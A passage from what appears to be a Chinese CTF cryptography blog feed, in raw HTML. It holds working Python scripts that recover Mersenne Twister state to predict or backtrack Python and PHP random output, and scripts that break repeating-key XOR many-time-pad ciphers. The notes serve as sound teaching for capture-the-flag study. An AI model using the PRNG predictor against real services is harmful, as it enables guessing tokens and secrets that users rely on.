m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    x = next(rand_iter)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><h4 id="more-1">More</h4><p><a href="https://www.math.cmu.edu/~af1p/Texfiles/RECONTRUNC.pdf" target="_blank" rel="noopener">https://www.math.cmu.edu/~af1p/Texfiles/RECONTRUNC.pdf</a></p><p>java的nextInt即适用该种LCG攻击模式，但网上多选择穷举（因为discard bits才只有<span class="math inline">\(2^{16}\)</span>，暴力更省事-.-）</p><h3 id="mt---predictbacktrace">MT - Predict/Backtrace</h3><h4 id="theorem-4">Theorem</h4><p>Mersenne Twister也是一种流行的PRNG算法，在python的random.getrandbits和php的mt_rand中均有使用</p><p>MT算法有624个32bits长的state，新一轮更新state的算法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] state;</span><br><span class="line"><span class="comment">// Iterate through the state</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">624</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// y is the first bit of the current number,</span></span><br><span class="line">  <span class="comment">// and the last 31 bits of the next number</span></span><br><span class="line">  <span class="keyword">int</span> y = (state[i] &amp; <span class="number">0x80000000</span>) + (state[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">  <span class="comment">// first bitshift y by 1 to the right</span></span><br><span class="line">  <span class="keyword">int</span> next = y &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// xor it with the 397th next number</span></span><br><span class="line">  next ^= state[(i + <span class="number">397</span>) % <span class="number">624</span>];</span><br><span class="line">  <span class="comment">// if y is odd, xor with magic number</span></span><br><span class="line">  <span class="keyword">if</span> ((y &amp; <span class="number">1L</span>) == <span class="number">1L</span>) &#123;</span><br><span class="line">    next ^= <span class="number">0x9908b0df</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// now we have the result</span></span><br><span class="line">  state[i] = next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从每个state生成等长(32bits)的随机数的算法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">currentIndex++;</span><br><span class="line"><span class="keyword">int</span> tmp = state[currentIndex];</span><br><span class="line">tmp ^= (tmp &gt;&gt;&gt; <span class="number">11</span>);</span><br><span class="line">tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>;</span><br><span class="line">tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>;</span><br><span class="line">tmp ^= (tmp &gt;&gt;&gt; <span class="number">18</span>);</span><br><span class="line"><span class="keyword">return</span> tmp;</span><br></pre></td></tr></table></figure><p>要破解MT算法，先决条件是要leak至少624个连续随机数(32bits)，或是说至少连续624*32bits二进制流</p><ul><li><p>Step 1(从随机数恢复state)</p><p>具体实现函数unBitshiftRightXor和unBitshiftLeftXor在exp中已给出，具体原理较容易推出，不在此赘述</p></li><li><p>Step 2(预测/回溯)</p><p>预测即正常生成新的state即可</p><p>回溯state则从state[623]开始（因为new_state[623]和(old_state[623],new_state[0],new_state[396])有关，且唯一未知的即为old_state[623]），回溯得到old_state[623]后，同理向前推即可</p></li></ul><h4 id="exp-3">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">rand_buffer = <span class="string">''</span></span><br><span class="line">states = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span><span class="params">()</span> -&gt; List[int]:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'random'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = [int(line.rstrip(<span class="string">'\n'</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line">    <span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    data = [random.getrandbits(32) for i in range(624)]</span></span><br><span class="line"><span class="string">    return data</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftLeftXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = (<span class="number">0xffffffff</span> &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftRightXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = ((<span class="number">0xffffffff</span> &lt;&lt; (<span class="number">32</span> - shift)) &amp; <span class="number">0xffffffff</span>) &gt;&gt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_states</span><span class="params">(data: List[int])</span> -&gt; List[int]:</span></span><br><span class="line">    states = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">        value = data[i]</span><br><span class="line">        value = unBitshiftRightXor(value, <span class="number">18</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">        value = unBitshiftLeftXor(value, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        value = unBitshiftLeftXor(value, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        value = unBitshiftRightXor(value, <span class="number">11</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">        states.append(value)</span><br><span class="line">    <span class="keyword">return</span> states</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_randbits</span><span class="params">(bit_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(bit_length % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    <span class="keyword">global</span> rand_buffer</span><br><span class="line">    <span class="keyword">if</span> len(rand_buffer) &gt;= (bit_length // <span class="number">4</span>):</span><br><span class="line">        res = rand_buffer[:bit_length // <span class="number">4</span>]</span><br><span class="line">        rand_buffer = rand_buffer[bit_length // <span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            y = (states[i] &amp; <span class="number">0x80000000</span>) + (states[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            res = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            res ^= states[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">                res ^= <span class="number">0x9908b0df</span></span><br><span class="line">            states[i] = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            value = states[i]</span><br><span class="line">            value ^= (value &gt;&gt; <span class="number">11</span>)</span><br><span class="line">            value ^= (value &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">            value ^= (value &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">            value ^= (value &gt;&gt; <span class="number">18</span>)</span><br><span class="line">            rand_buffer += hex(value)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">        res = rand_buffer[:bit_length // <span class="number">4</span>]</span><br><span class="line">        rand_buffer = rand_buffer[bit_length // <span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace_randbits</span><span class="params">(bit_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(bit_length % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">623</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        tmp = states[i]</span><br><span class="line">        tmp ^= states[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) == <span class="number">0x80000000</span>:</span><br><span class="line">            tmp ^= <span class="number">0x9908b0df</span></span><br><span class="line">        res = (tmp &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x80000000</span>    <span class="comment">#the first bit of the res</span></span><br><span class="line">        <span class="comment"># the remaining 31 bits of the res</span></span><br><span class="line">        tmp = states[(i - <span class="number">1</span> + <span class="number">624</span>) % <span class="number">624</span>]</span><br><span class="line">        tmp ^= states[(i + <span class="number">396</span>) % <span class="number">624</span>]</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) == <span class="number">0x80000000</span>:</span><br><span class="line">            tmp ^= <span class="number">0x9908b0df</span></span><br><span class="line">            res |= <span class="number">1</span></span><br><span class="line">        res |= (tmp &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x7fffffff</span></span><br><span class="line">        states[i] = res</span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> state <span class="keyword">in</span> states[-(bit_length // <span class="number">32</span> + <span class="number">1</span>):]:</span><br><span class="line">        state ^= (state &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        state ^= (state &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">        state ^= (state &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">        state ^= (state &gt;&gt; <span class="number">18</span>)</span><br><span class="line">        value += hex(state)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> value[-bit_length // <span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    data = read_data()</span><br><span class="line">    <span class="comment"># predict</span></span><br><span class="line">    states = crack_states(data[<span class="number">-624</span>:])</span><br><span class="line">    print(int(predict_randbits(<span class="number">32</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="comment"># backtrace</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    states = crack_states(data[:624])</span></span><br><span class="line"><span class="string">    print(backtrace_randbits(32 * 4))</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="more-2">More</h4><p>或者python2下直接调用randcrack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">Rand = RandCrack()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'random'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = [int(line.rstrip(<span class="string">'\n'</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"><span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">    Rand.submit(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(data)):</span><br><span class="line">    Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="keyword">print</span> Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br></pre></td></tr></table></figure><h3 id="视时间补充">视时间补充</h3>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PRNG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(stream)</title>
      <link href="/2020/03/12/Summary-of-Crypto-in-CTF-stream/"/>
      <url>/2020/03/12/Summary-of-Crypto-in-CTF-stream/</url>
      
        <content type="html"><![CDATA[<h3 id="stream-cipher---many-time-pad">Stream Cipher - Many Time Pad</h3><h4 id="theorem">Theorem</h4><ul><li><p>流密钥循环使用</p></li><li><p>猜测密钥长度</p><p>Hamming Distance（二进制下两个等长字符串的比特位差异）</p><p>大小写英文字符两两的平均Hamming距离为2 ~ 3，而任意字符两两的平均Hamming距离为4 <span class="math display">\[\therefore Assumed\quad c1=p1\oplus key,c2=p2\oplus key\\\\\because c1\oplus c2=p1\oplus p2\quad \therefore HammingDis(c1,c2)=HammingDis(p1,p2)\]</span> 取合适的密钥长度上下界，进行分组计算汉明距离</p><p>将二元组(key_length, distance)按distance升序排列，取前五组验证即可</p></li><li><p>逐字节破解密钥</p><p>在猜测的密钥长度基础上，分割Cipher（用同一密钥字节加密的密文归入同组）</p><p><strong>字频分析</strong></p><p>遍历range(0xff)，和标准频率表（含空格和字母）内积最大的即猜测为正确密钥字节</p><p>因为不正确密钥字节下也可能内积很大，所以进行如下filter：</p><ul><li><p>decode('ascii')出错 =&gt; return 0</p></li><li><p>cipher分组里为空格或字母的字符总数 &lt; len(cipher_fragment) // 1.5 =&gt; return 0</p></li></ul><p><strong>爆破空格</strong></p><p>基于空格和小写字母异或结果为对应大写字母，和大写字母异或结果为对应小写字母这一特性</p><p>对同一分组的cipher进行两两异或（相当于plain两两异或），记录每个字符与其他所有字符异或结果落在落在大小写字母和0x00上的次数，即可认为最大次数对应的字符位置上的明文为空格</p></li></ul><h4 id="exp">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">std_rate = &#123;<span class="string">' '</span>: <span class="number">0.18399868388580254</span>, <span class="string">'a'</span>: <span class="number">0.06528332604415538</span>, <span class="string">'b'</span>: <span class="number">0.012531342868095015</span>, <span class="string">'c'</span>: <span class="number">0.021018439349774747</span>, <span class="string">'d'</span>: <span class="number">0.03523431934577844</span>, <span class="string">'e'</span>: <span class="number">0.10261742470196494</span>, <span class="string">'f'</span>: <span class="number">0.019179805952664334</span>, <span class="string">'g'</span>: <span class="number">0.016178672025026573</span>, <span class="string">'h'</span>: <span class="number">0.050890812568726566</span>, <span class="string">'i'</span>: <span class="number">0.056467348737766584</span>, <span class="string">'j'</span>: <span class="number">0.0011847320400802188</span>, <span class="string">'k'</span>: <span class="number">0.006037640287976256</span>, <span class="string">'l'</span>: <span class="number">0.03310705983030898</span>,</span><br><span class="line">            <span class="string">'m'</span>: <span class="number">0.02089774777877722</span>, <span class="string">'n'</span>: <span class="number">0.056334978507447564</span>, <span class="string">'o'</span>: <span class="number">0.06194486601507346</span>, <span class="string">'p'</span>: <span class="number">0.014653281404481763</span>, <span class="string">'q'</span>: <span class="number">0.0009593791262805568</span>, <span class="string">'r'</span>: <span class="number">0.048625794552908115</span>, <span class="string">'s'</span>: <span class="number">0.051741663225580235</span>, <span class="string">'t'</span>: <span class="number">0.07413556318261176</span>, <span class="string">'u'</span>: <span class="number">0.023188985607049396</span>, <span class="string">'v'</span>: <span class="number">0.008010827191217628</span>, <span class="string">'w'</span>: <span class="number">0.018155155658972653</span>, <span class="string">'x'</span>: <span class="number">0.0014651754741116037</span>, <span class="string">'y'</span>: <span class="number">0.015511271998835988</span>, <span class="string">'z'</span>: <span class="number">0.0006457026385315064</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_xor</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(y) &gt; len(x):</span><br><span class="line">        x, y = y, x</span><br><span class="line">    <span class="keyword">return</span> bytes([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(x[:len(y)], y)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    dis = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bytes_xor(x, y):</span><br><span class="line">        dis += bin(byte).count(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">return</span> dis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_length</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    average_distances = []</span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">        cipher_fragments = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> key_length * (i + <span class="number">1</span>) &gt; len(cipher):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            cipher_fragments.append(</span><br><span class="line">                cipher[key_length * i: key_length * (i + <span class="number">1</span>)])</span><br><span class="line">        distance = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_fragments) - <span class="number">1</span>):</span><br><span class="line">            distance += hamming_distance(</span><br><span class="line">                cipher_fragments[i], cipher_fragments[i + <span class="number">1</span>])</span><br><span class="line">        distance /= (key_length * len(cipher_fragments))</span><br><span class="line">        average_distances.append((key_length, distance))</span><br><span class="line">    average_distances.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> average_distances</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># 字频分析</span></span><br><span class="line"><span class="string">def dot_multiply(p):</span></span><br><span class="line"><span class="string">    rate = [0] * 27</span></span><br><span class="line"><span class="string">    tmp_len = 0</span></span><br><span class="line"><span class="string">    for _ in p:</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            _ = bytes([_]).decode('ascii')</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            return 0</span></span><br><span class="line"><span class="string">        _ = _.lower()</span></span><br><span class="line"><span class="string">        if _ in std_rate:</span></span><br><span class="line"><span class="string">            tmp_len += 1</span></span><br><span class="line"><span class="string">            if _ == ' ':</span></span><br><span class="line"><span class="string">                rate[0] += 1</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                rate[ord(_) - ord('a') + 1] += 1</span></span><br><span class="line"><span class="string">    if not tmp_len or tmp_len &lt; len(p) // 1.5:</span></span><br><span class="line"><span class="string">        return 0</span></span><br><span class="line"><span class="string">    rate = [i / tmp_len for i in rate]</span></span><br><span class="line"><span class="string">    res = rate[0] * std_rate[' ']</span></span><br><span class="line"><span class="string">    for i in range(1, 27):</span></span><br><span class="line"><span class="string">        res += rate[i] * std_rate[chr(ord('a') + i - 1)]</span></span><br><span class="line"><span class="string">    return res</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def crack_key_fragment(cipher_fragment):</span></span><br><span class="line"><span class="string">    max_dotmul_res = 0</span></span><br><span class="line"><span class="string">    pro_key_fragment = 0</span></span><br><span class="line"><span class="string">    for key_fragment in range(0xff):</span></span><br><span class="line"><span class="string">        key_set = [key_fragment] * len(cipher_fragment)</span></span><br><span class="line"><span class="string">        plain_fragment = bytes_xor(key_set, cipher_fragment)</span></span><br><span class="line"><span class="string">        dotmul_res = dot_multiply(plain_fragment)</span></span><br><span class="line"><span class="string">        if dotmul_res &gt; max_dotmul_res:</span></span><br><span class="line"><span class="string">            max_dotmul_res = dotmul_res</span></span><br><span class="line"><span class="string">            pro_key_fragment = key_fragment</span></span><br><span class="line"><span class="string">    return pro_key_fragment</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def crack_key(cipher, average_distances):</span></span><br><span class="line"><span class="string">    for key_length, _ in average_distances[:5]:</span></span><br><span class="line"><span class="string">        key = []</span></span><br><span class="line"><span class="string">        cipher_fragments = [[] for _ in range(key_length)]</span></span><br><span class="line"><span class="string">        for i, byte in enumerate(cipher):</span></span><br><span class="line"><span class="string">            cipher_fragments[i % key_length].append(byte)</span></span><br><span class="line"><span class="string">        for cipher_fragment in cipher_fragments:</span></span><br><span class="line"><span class="string">            key.append(crack_key_fragment(cipher_fragment))</span></span><br><span class="line"><span class="string">        print(bytes(key))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破空格</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_fragment</span><span class="params">(cipher_fragment)</span>:</span></span><br><span class="line">    max_possible = <span class="number">0</span></span><br><span class="line">    pro_space = <span class="number">0</span>  <span class="comment"># 空格下标索引</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">'ascii'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_fragment)):</span><br><span class="line">        possible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(cipher_fragment)):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            _ = cipher_fragment[i] ^ cipher_fragment[j]</span><br><span class="line">            <span class="keyword">if</span> _ <span class="keyword">in</span> letters <span class="keyword">or</span> _ == <span class="number">0</span>:</span><br><span class="line">                possible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> possible &gt; max_possible:</span><br><span class="line">            max_possible = possible</span><br><span class="line">            pro_space = i</span><br><span class="line">    <span class="keyword">return</span> cipher_fragment[pro_space] ^ <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(cipher, average_distances)</span>:</span></span><br><span class="line">    <span 